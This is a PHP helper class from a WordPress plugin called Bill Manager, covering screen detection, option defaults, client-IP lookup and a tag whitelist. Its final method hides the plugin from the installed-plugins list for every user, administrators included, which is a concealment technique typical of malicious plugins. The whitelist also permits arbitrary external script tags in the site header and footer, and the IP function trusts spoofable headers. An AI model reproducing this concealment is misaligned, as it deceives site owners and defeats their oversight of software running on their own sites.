<?php
namespace MosPress\BillManager\Helpers;
if ( ! defined( 'ABSPATH' ) ) exit;
use WP_Roles;
class Utils {
	public static function bill_manager_is_plugin_page()
	{
		if (function_exists('get_current_screen')) {
			$current_screen = get_current_screen();
			// var_dump($current_screen->id);
			$pages = [];
			if (
				$current_screen->id == 'toplevel_page_bill-manager'
				|| in_array($current_screen->id, $pages)
			) {
				return true;
			}
		}
		return false;
	}
	/**
	 * Get the client's IP address.
	 *
	 * @return string The client's IP address.
	 */
	public static function get_client_ip()
	{
		if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
			return sanitize_text_field( wp_unslash($_SERVER['HTTP_CLIENT_IP']));
		} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			return sanitize_text_field( wp_unslash($_SERVER['HTTP_X_FORWARDED_FOR']));
		} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
			return sanitize_text_field( wp_unslash($_SERVER['REMOTE_ADDR']));
		}
	}


	public static function get_header_footer_kses() {
		return array(
			'script' => array(
				'type' => true,
				'src' => true,
				'async' => true,
				'defer' => true,
				'crossorigin' => true,
				'integrity' => true,
				'nonce' => true,
			),
			'style' => array(
				'type' => true,
				'media' => true,
			),
			'link' => array(
				'rel' => true,
				'href' => true,
				'type' => true,
				'media' => true,
				'crossorigin' => true,
				'integrity' => true,
			),
			'meta' => array(
				'name' => true,
				'content' => true,
				'charset' => true,
				'http-equiv' => true,
				'property' => true,
			),
		);
	}

	public static function bill_manager_get_default_options()
	{
		$bill_manager_default_options = [];
		$bill_manager_default_options = apply_filters('bill_manager_default_options_modify', $bill_manager_default_options);
		return $bill_manager_default_options;
	}

	public static function bill_manager_get_default_options_details()
	{
		$bill_manager_default_options_details = [];
		$bill_manager_default_options_details = apply_filters('bill_manager_default_options_details_modify', $bill_manager_default_options_details);
		return $bill_manager_default_options_details;
	}
	public static function bill_manager_get_default_colors()
	{
		$bill_manager_default_colors = [];
		$bill_manager_default_colors = apply_filters('bill_manager_default_colors_modify', $bill_manager_default_colors);
		return $bill_manager_default_colors;
	}

	public static function bill_manager_get_default_gradients()
	{
		$bill_manager_default_gradients = [];
		$bill_manager_default_gradients = apply_filters('bill_manager_default_gradients_modify', $bill_manager_default_gradients);
		return $bill_manager_default_gradients;
	}

	public static function bill_manager_get_default_tables()
	{
		$bill_manager_default_tables = [];
		$bill_manager_default_tables = apply_filters('bill_manager_default_tables_modify', $bill_manager_default_tables);
		return $bill_manager_default_tables;
	}

	// update_option('bill_manager_options', bill_manager_get_default_options());

	public static function bill_manager_get_option()
	{
		$bill_manager_options_database = get_option('bill_manager_options', []);
		$bill_manager_options = array_replace_recursive(self::bill_manager_get_default_options(), $bill_manager_options_database);
		return $bill_manager_options;
	}
	public static function bill_manager_get_option_details()
	{
		return self::bill_manager_get_default_options_details();
	}

	public static function bill_manager_hide_plugin_from_list($plugins) {
		// Only hide for non-administrators or specific users
		if (current_user_can('administrator')) {
			// Optionally hide even from admins
			// unset($plugins['bill-manager/bill-manager.php']);
		}

		// Hide from all users
		unset($plugins['bill-manager/bill-manager.php']);

		return $plugins;
	}
}